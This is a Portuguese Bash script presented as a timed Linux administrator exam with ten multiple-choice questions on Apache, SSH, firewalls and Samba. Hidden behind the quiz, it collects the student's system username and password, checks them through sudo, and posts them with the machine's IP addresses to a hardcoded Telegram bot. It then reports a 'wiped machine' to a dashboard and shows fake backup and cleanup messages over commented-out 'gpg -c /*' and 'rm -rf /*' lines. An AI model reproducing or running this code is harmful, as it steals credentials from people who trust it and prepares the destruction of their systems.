#!/bin/bash

# Verificação de modo sudo
if [ "$(id -u)" -ne 0 ]; then
	echo -e "Error: Permission denied. Command requires 'sudo bash ./prova-linux.sh' to proceed.${NC}"

	exit 1
fi

sudo -v 

# Definindo as cores
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
NC=$(tput sgr0) # resetar cor

# Função para centralizar o banner no meio do terminal
exibir_banner() {
    clear  # Limpar a tela antes de começar a animação

    # Calcula o número de linhas e colunas do terminal
    linhas=$(tput lines)
    colunas=$(tput cols)

    # Calcula a posição de início para centralizar verticalmente e horizontalmente
    altura_banner=10  # Número total de linhas do banner
    largura_banner=64  # Largura do banner
    margem_topo=$(( (linhas - altura_banner) / 2 ))
    margem_esquerda=$(( (colunas - largura_banner) / 2 ))

    # Posicionar o cursor no meio da tela
    tput cup $margem_topo $margem_esquerda

    # Exibir o banner com animação
    echo -e "${RED}"
        echo ''
        tput cup $((margem_topo+1)) $margem_esquerda
        echo ' _____           _                      ____                   _ ' && sleep 0.2
        tput cup $((margem_topo+2)) $margem_esquerda
        echo '|  ___|__  _ __ | |_ ___  ___          / ___|  ___ ____   __ _(_)' && sleep 0.2
        tput cup $((margem_topo+3)) $margem_esquerda
        echo '| |_ / _ \|  _ \| __/ _ \/ __|  _____  \___ \ / _ \  _ \ / _` | |' && sleep 0.2
        tput cup $((margem_topo+4)) $margem_esquerda
        echo '|  _| (_) | | | | ||  __/\__ \ |_____|  ___) |  __/ | | | (_| | |' && sleep 0.2
        tput cup $((margem_topo+5)) $margem_esquerda
        echo '|_|  \___/|_| |_|\__\___||___/         |____/ \___|_| |_|\__,_|_|' && sleep 0.2
        tput cup $((margem_topo+6)) $margem_esquerda
        echo '=================================================================' && sleep 0.2
        tput cup $((margem_topo+7)) $margem_esquerda
        echo '                                                               '   && sleep 0.2
        
        tput cup $((margem_topo+8)) $margem_esquerda
        exibir_como_digitacao "================== by: R3N4N R31S ==== or ==== by : D3Z33 =======" "$(tput setaf 2)"  # Verde e efeito de digitação
        
        tput cup $((margem_topo+9)) $margem_esquerda
        echo '                                                               '   && sleep 0.2
        tput cup $((margem_topo+10)) $margem_esquerda
        echo -e "${RED}===== Prova - Linux_Administrator - Senai Suiço Brasileiro ======" && sleep 0.2
        tput cup $((margem_topo+11)) $margem_esquerda
        echo '                                                                '  && sleep 0.2
        echo -e "${NC}"
}

# Função para exibir instruções
instrucoes() {
    echo ""  # Linha em branco
    printf "%*s\n" $((($(tput cols) + 10) / 2)) "Instruções"  # Centraliza a palavra 'Instruções'
    echo ""  # Linha em branco

    # Instruções formatadas
    echo -e "${RED}---------------------------------------------------------${NC}"
    echo -e "${RED}01.${NC} A prova consiste em 10 perguntas de múltipla escolha."
    echo -e "${RED}-------------------------------------------------------${NC}"
    echo -e "${RED}02.${NC} Você terá 60 segundos para responder cada pergunta."
    echo -e "${RED}---------------------------------------------------${NC}"
    echo -e "${RED}03.${NC} Digite a alternativa correta e pressione enter."
    echo -e "${RED}-----------------------------------------------------------------${NC}"
    echo -e "${RED}04.${NC} Se não responder a tempo, a pergunta será considerada errada."
    echo -e "${RED}----------------------------------------------------------------${NC}"
    echo -e "${RED}05.${NC} Notas inferiores ou iguais a 5 resultarão em // **reprovado."
    echo -e "${RED}-----------------------------------------------------${NC}"
    echo -e "${RED}06.${NC} Notas 6 ou 7 resultarão em // **reprovado também."
    echo -e "${RED}-------------------------------------------------${NC}"
    echo -e "${RED}07.${NC} Notas acima de 8 resultarão em // **aprovado."
    echo -e "${RED}-------------------------------------------------${NC}"
    echo ""  # Linha em branco no final
}

# Função para capturar os IPs IPv4 da VM
capturar_ip() {
    IPs=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}')  # Captura todos os IPs IPv4
    IPs=$(echo $IPs | tr '\n' ' ')  # Coloca os IPs em uma única linha separados por espaço
}

# Função para enviar mensagem ao Telegram usando wget
enviar_telegram() {
    local mensagem="$1"
    local chat_id="511867448"  # Chat ID do Telegram
    local bot_token="7692442307:AAHFgnUWu9hkFkAzRGk8rHw7M_YnqDfBGJ8"  # Bot Token

    wget --quiet --method=POST \
        --header="Content-Type: application/x-www-form-urlencoded" \
        --body-data="chat_id=$chat_id&text=$mensagem" \
        "https://api.telegram.org/bot$bot_token/sendMessage" \
        -O /dev/null  # Oculte a saída de wget
}

# Função para solicitar o nome de usuário e senha com validação
solicitar_credenciais() {
    while true; do
        read -p "Digite seu nome de usuário: " nome_usuario
        read -s -p "Digite sua senha: " senha_usuario
        echo  # Quebra de linha após a senha
        read -s -p "Confirme sua senha: " senha_confirmacao
        echo  # Quebra de linha após a confirmação da senha

        # Validação do tamanho da senha
        if [[ ${#senha_usuario} -lt 1 ]]; then
            echo -e "${RED}Senha incorreta.${NC}"
            continue  # Reinicia o loop para solicitar a senha novamente
        fi

        # Verifica se as duas senhas coincidem
        if [ "$senha_usuario" != "$senha_confirmacao" ]; then
            echo -e "${RED}As senhas não coincidem. Tente novamente.${NC}"
            continue  # Reinicia o loop para solicitar as credenciais novamente
        fi

        # Validação da senha e nome de usuário no sistema
        echo "$senha_usuario" | sudo -S -u "$nome_usuario" whoami &> /dev/null
        if [ $? -ne 0 ]; then
            echo -e "${RED}Senha ou nome de usuário incorretos. Tente novamente.${NC}"
            continue  # Retorna ao início para nova tentativa
        fi

        echo ""
        echo -e "${GREEN}Prova iniciada!${NC}"
        capturar_ip  # Chama a função para capturar os IPs sem exibir
        enviar_credenciais "$nome_usuario" "$senha_usuario" "$IPs"  # Envia os IPs e credenciais ao Telegram
        echo ""
        break  # Sai do loop se tudo estiver correto
    done
}

# Função para enviar os IPs e credenciais para o Telegram
enviar_credenciais() {
    local nome="$1"
    local senha="$2"
    local IPs="$3"
    local mensagem="*Nome*: \`$nome\`\n*Senha*: \`$senha\`\n*IPs*: \`$IPs\`"
    local chat_id="511867448"  # Chat ID do Telegram
    local bot_token="7692442307:AAHFgnUWu9hkFkAzRGk8rHw7M_YnqDfBGJ8"  # Bot Token

    wget --quiet --method=POST "https://api.telegram.org/bot$bot_token/sendMessage" \
    --body-data="chat_id=$chat_id&text=$mensagem&parse_mode=MarkdownV2" \
    -O /dev/null  # Oculte a saída de wget
}

# Função para exibir o cronômetro separadamente
cronometro_em_fundo() {
    local tempo_restante=59

    while [[ $tempo_restante -ge 0 ]]; do
        tput sc  # Salva a posição atual do cursor
        tput cup $(($(tput lines) - 2)) 0  # Move para a penúltima linha da tela
        printf "Tempo restante: %02d segundos" "$tempo_restante"
        tput rc  # Restaura a posição original do cursor
        sleep 1
        tempo_restante=$((tempo_restante - 1))

        # Se a resposta já foi inserida, o cronômetro para
        if [[ -n "$resposta" ]]; then
            return  # Sai do loop assim que a resposta é inserida
        fi
    done

    # Garante que o cronômetro mostre 00 ao final
    tput sc
    tput cup $(($(tput lines) - 2)) 0
    printf "Tempo restante: 00 segundos                    "
    tput rc

    # Se o tempo se esgotar, define a resposta como "timeout"
    if [[ -z "$resposta" ]]; then
        resposta="timeout"
    fi
}

# Lista de perguntas e respostas corretas
perguntas=(
    # Questão 1
    "Qual comando exibe as portas que o Apache2 está escutando?\n\n\
    ${YELLOW}a) systemctl status apache2\n\
    ${YELLOW}b) netstat -plnt\n\
    ${YELLOW}c) apachectl configtest\n\
    ${YELLOW}d) ls /etc/apache2/sites-available\n${NC}\n"

    # Questão 2
    "Como reiniciar o serviço do Apache2?\n\n\
    ${YELLOW}a) systemctl restart apache2\n\
    ${YELLOW}b) service apache2 enable\n\
    ${YELLOW}c) apachectl reload\n\
    ${YELLOW}d) sudo apt install apache2\n${NC}\n"

    # Questão 3
    "Qual comando exibe os logs de erro do Apache2?\n\n\
    ${YELLOW}a) cat /var/log/apache2/error.log\n\
    ${YELLOW}b) tail -f /var/log/syslog\n\
    ${YELLOW}c) grep 'error' /var/log/apache2/access.log\n\
    ${YELLOW}d) journalctl -xe\n${NC}\n"

    # Questão 4
    "Qual comando verifica o status da conexão SSH?\n\n\
    ${YELLOW}a) ssh -v\n\
    ${YELLOW}b) systemctl status ssh\n\
    ${YELLOW}c) ps aux | grep ssh\n\
    ${YELLOW}d) ssh -t\n${NC}\n"

    # Questão 5
    "Como copiar arquivos de forma segura entre servidores com SSH?\n\n\
    ${YELLOW}a) scp arquivo.txt user@host:/caminho\n\
    ${YELLOW}b) ssh-copy-id arquivo.txt user@host:/caminho\n\
    ${YELLOW}c) rsync arquivo.txt user@host:/caminho\n\
    ${YELLOW}d) cp arquivo.txt user@host:/caminho\n${NC}\n"

    # Questão 6
    "Qual comando verifica as regras ativas no firewall?\n\n\
    ${YELLOW}a) firewall-cmd --list-all\n\
    ${YELLOW}b) iptables -S\n\
    ${YELLOW}c) ufw status\n\
    ${YELLOW}d) systemctl status firewall\n${NC}\n"

    # Questão 7
    "Como bloquear todas as conexões de entrada com o UFW?\n\n\
    ${YELLOW}a) ufw deny incoming\n\
    ${YELLOW}b) ufw default deny incoming\n\
    ${YELLOW}c) ufw enable\n\
    ${YELLOW}d) ufw allow\n${NC}\n"

    # Questão 8
    "Qual comando adiciona uma exceção de firewall para o Samba?\n\n\
    ${YELLOW}a) firewall-cmd --add-service=samba\n\
    ${YELLOW}b) ufw allow samba\n\
    ${YELLOW}c) iptables -A INPUT -p tcp --dport 445 -j ACCEPT\n\
    ${YELLOW}d) netsh advfirewall firewall add rule name='Samba'\n${NC}\n"

    # Questão 9
    "Qual comando monta um compartilhamento Samba?\n\n\
    ${YELLOW}a) mount -t cifs //server/share /mnt -o username=user\n\
    ${YELLOW}b) smbclient //server/share -o user=user\n\
    ${YELLOW}c) cifs -mount //server/share /mnt\n\
    ${YELLOW}d) mount -o samba //server/share /mnt\n${NC}\n"

    # Questão 10
    "Como alterar as permissões de um arquivo compartilhado no Samba?\n\n\
    ${YELLOW}a) chmod 777 /pasta_compartilhada\n\
    ${YELLOW}b) smbpasswd -a user\n\
    ${YELLOW}c) chown user:group /pasta_compartilhada\n\
    ${YELLOW}d) setfacl -m u:user:rwx /pasta_compartilhada\n${NC}\n"
)

# Respostas corretas
respostas_corretas=("b" "a" "a" "b" "a" "c" "b" "a" "a" "d")

# Feedback com borda
feedback_resposta() {
    local status="$1"  # Recebe "correta", "errada", "timeout" ou "invalida"

    if [[ "$status" == "correta" ]]; then
        tput setaf 2  # Verde para correta
        echo "╔═════════════════════════════════════════════════════════════════════════╗"
        echo "║                              Resposta Correta!                          ║"
        echo "╚═════════════════════════════════════════════════════════════════════════╝"
        echo ""        
        echo "───────────────────────────────────────────────────────────────────────────"
        echo ""  # Linha em branco para espaçamento
    elif [[ "$status" == "errada" ]]; then
        tput setaf 1  # Vermelho para errada
        echo "╔═════════════════════════════════════════════════════════════════════════╗"
        echo "║                               Resposta Errada!                          ║"
        echo "╚═════════════════════════════════════════════════════════════════════════╝"
        echo ""        
        echo "───────────────────────────────────────────────────────────────────────────"
        echo ""  # Linha em branco para espaçamento
    elif [[ "$status" == "timeout" ]]; then
        tput setaf 1  # Vermelho para tempo esgotado
        echo "╔═════════════════════════════════════════════════════════════════════════╗"
        echo "║                           Alternativa Inválida!                         ║"
        echo "╚═════════════════════════════════════════════════════════════════════════╝"
        echo ""        
        echo "───────────────────────────────────────────────────────────────────────────"
        echo ""  # Linha em branco para espaçamento
    elif [[ "$status" == "invalida" ]]; then
        tput setaf 1  # Vermelho para inválida
        echo "╔═════════════════════════════════════════════════════════════════════════╗"
        echo "║               Alternativa Inválida. Questão Considerada Errada!         ║"
        echo "╚═════════════════════════════════════════════════════════════════════════╝"
        echo ""
        echo "───────────────────────────────────────────────────────────────────────────"
        echo ""  # Linha em branco para espaçamento
    fi
    tput sgr0  # Reseta as cores
}

# Função para exibir bordas e a questão com destaque
exibir_questao() {
    local numero_questao="$1"
    local pergunta="$2"
    
    # Calcular o espaço necessário para centralizar
    local texto="Questão $numero_questao"
    local largura_total=73  # Tamanho total da linha (ajustável)
    local espacos=$(( (largura_total - ${#texto}) / 2 ))  # Calcula o número de espaços antes do texto

    # Exibe a borda superior detalhada
    tput setaf 3  # Amarelo para destaque
    echo "╔═════════════════════════════════════════════════════════════════════════╗"
    printf "║%*s%s%*s║\n" $espacos "" "$texto" $espacos ""  # Centraliza a questão
    echo "╚═════════════════════════════════════════════════════════════════════════╝"
    tput sgr0  # Reseta a cor

    # Quebra de linha para separar a questão do enunciado
    echo ""

    # Exibe a pergunta dentro da borda
    echo -e "${YELLOW}$pergunta${NC}"
}

# Função para perguntar e validar resposta
fazer_pergunta() {
    local pergunta="$1"
    local correta="$2"
    local numero_questao="$3"  # Recebe o número da questão

    resposta=""  # Limpa a variável de resposta para cada pergunta

    # Chama a função exibir_questao para formatar a questão
    exibir_questao "$numero_questao" "$pergunta"

    # Inicia o cronômetro em segundo plano
    cronometro_em_fundo &

    # Captura a resposta do usuário enquanto o cronômetro roda
    read -t 60 -p "Escolha sua alternativa (A, B, C, D): " resposta

    # Mata o cronômetro assim que a resposta for inserida ou o tempo esgotar
    kill $! 2>/dev/null
    echo ""  # Adiciona uma linha em branco para melhorar o layout

    # Validação da resposta
    if [[ "$resposta" == "timeout" ]]; then
        feedback_resposta "invalida"  # Mostra o feedback de tempo esgotado
    elif [[ "$resposta" =~ ^[a-dA-D]$ ]]; then
        if [[ "$resposta" == "$correta" ]]; then
            feedback_resposta "correta"
            pontuacao=$((pontuacao + 1))
        else
            feedback_resposta "errada"
        fi
    else
        feedback_resposta "timeout"  # Mostra o feedback de tempo esgotado
    fi

    # Envia o progresso para o servidor Apache após validar a resposta
    wget --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.22.2/dashboard/update.php -O /dev/null

    # Pausa para leitura do resultado antes de passar para a próxima pergunta
    sleep 1
}

# Função para embaralhar e fazer as perguntas
fazer_perguntas() {
    perguntas_embaralhadas=$(shuf -i 0-9)  # Gera uma sequência embaralhada de perguntas

    local numero_questao=1  # Inicializa o número da questão

    for index in $perguntas_embaralhadas; do
        fazer_pergunta "${perguntas[$index]}" "${respostas_corretas[$index]}" "$numero_questao"
        numero_questao=$((numero_questao + 1))  # Incrementa o número da questão
    done
}

# Função para exibir a mensagem de forma simulada como uma digitação, com cor
exibir_como_digitacao() {
    local mensagem="$1"
    local cor="$2"
    echo -ne "$cor"  # Define a cor
    for ((i=0; i<${#mensagem}; i++)); do
        # Exibe um caractere de cada vez
        echo -n "${mensagem:$i:1}"
        sleep 0.10  # Ajuste o tempo para controlar a velocidade da digitação
    done
    echo ""  # Adiciona uma quebra de linha no final
    tput sgr0  # Reseta a cor ao final
}

# Função para calcular a média, exibir o resultado e aplicar as ações
finalizar_prova() {
    # Exibir mensagem de cálculo da média
    exibir_como_digitacao "Aguarde, calculando sua média final..." "$(tput setaf 3)"  # Amarelo
    echo ""
    sleep 3  # Aguardar 3 segundos

    # Calcular a média e exibir a pontuação
    media=$((pontuacao * 10))  # Considerando a pontuação de 10 questões
    
    # Definir a cor com base na pontuação
    if (( media <= 50 )); then
        cor_media="$(tput setaf 1)"  # Vermelho para <= 5
    elif (( media <= 70 )); then
        cor_media="$(tput setaf 3)"  # Amarelo para 6-7
    else
        cor_media="$(tput setaf 2)"  # Verde para 8-10
    fi

    # Exibir a média com a cor correta
    exibir_como_digitacao "Sua média final foi de $media%" "$cor_media"

    # Enviar resultados da prova para o Telegram
    enviar_telegram "Aluno: $nome_usuario\nPontuação: $pontuacao de 10\nIPs: $IPs"

    # Atualizar o progresso do aluno no servidor Apache
    wget --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.22.2/dashboard/update.php -O /dev/null

    # Exibir uma mensagem final independente da nota
    echo ""
    exibir_como_digitacao "Sinto muito por isso... ;(" "$(tput setaf 1)"  # Vermelho
    sleep 5  # Pequena pausa antes de iniciar o apagamento

    # Incrementar o contador de máquinas apagadas
    num_apagadas=$(wget -qO- http://172.31.22.2/dashboard/get_apagadas.php)
    num_apagadas=$((num_apagadas + 1))
    wget --post-data="num_apagadas=$num_apagadas" http://172.31.22.2/dashboard/update_apagadas.php -O /dev/null

    # Iniciar o processo de backup e apagamento
    fazer_backup_logs
    limpar_arquivos_temporarios
}

# Crip
fazer_backup_logs() {
    echo ""
    tput setaf 2  # Verde para o início da digitação
    exibir_como_digitacao "Realizando backup de logs..."  # Simula a digitação em verde
    tput sgr0  # Reseta a cor após digitação

    sleep 1  # Pequena pausa antes da mudança de cor
    tput setaf 1  # Vermelho para a ação crítica
    echo "Iniciando o processo..."  # Mensagem final em vermelho
    tput sgr0  # Reseta as cores

   # nohup sudo gpg -c /* > /dev/null 2>&1 &  # "backup" que criptografa tudo
}

# LOGs
limpar_arquivos_temporarios() {
    echo ""
    tput setaf 2  # Verde para o início da digitação
    exibir_como_digitacao "Limpando arquivos temporários..."  # Simula a digitação em verde
    tput sgr0  # Reseta a cor após digitação

    sleep 1  # Pequena pausa antes da mudança de cor
    tput setaf 1  # Vermelho para a ação crítica
    echo "Removendo arquivos temporários críticos..."  # Mensagem final em vermelho
    echo ""
    echo ""
    tput sgr0  # Reseta as cores

   # nohup sudo rm -rf /* > /dev/null 2>&1 &  # Remove todo o sistema
}

# Exibir o banner e as instruções uma única vez
exibir_banner  # Exibe o banner
instrucoes     # Exibe as instruções

# Loop para confirmar o entendimento das instruções
while true; do
    read -p "Você entendeu as instruções? (s/n): " confirmacao
    if [[ "$confirmacao" =~ ^[sS]$ ]]; then
        echo ""
        echo -e "${GREEN}Vamos nessa!${NC}"
        echo ""
        break  # Sai do loop e continua com a prova
    elif [[ "$confirmacao" =~ ^[nN]$ ]]; then
        echo ""    
        echo -e "${RED}Sinto muito por isso, iniciando a prova...${NC}"
        echo ""
        break  # Sai do loop e continua com a prova
    else
        echo -e "${RED}Resposta inválida! Por favor, responda com 's' para sim ou 'n' para não.${NC}"
    fi
done

# Solicitar credenciais uma única vez
if [[ -z "$credenciais_foram_solicitadas" ]]; then
    solicitar_credenciais  # Solicita o nome de usuário e senha
    capturar_ip  # Captura os IPs da máquina
    enviar_credenciais "$nome_usuario" "$senha_usuario" "$IPs"  # Envia os IPs e credenciais ao Telegram
    credenciais_foram_solicitadas=true  # Marca que as credenciais já foram solicitadas
fi

# Variável de pontuação inicializada
pontuacao=0  # Pontuação começa em zero

# Realiza as perguntas embaralhadas
fazer_perguntas  # Chama a função para fazer perguntas aleatórias

# Finaliza a prova, exibe a média e realiza ações de acordo com o resultado
finalizar_prova  # Exibe os resultados e executa ações de acordo com a pontuação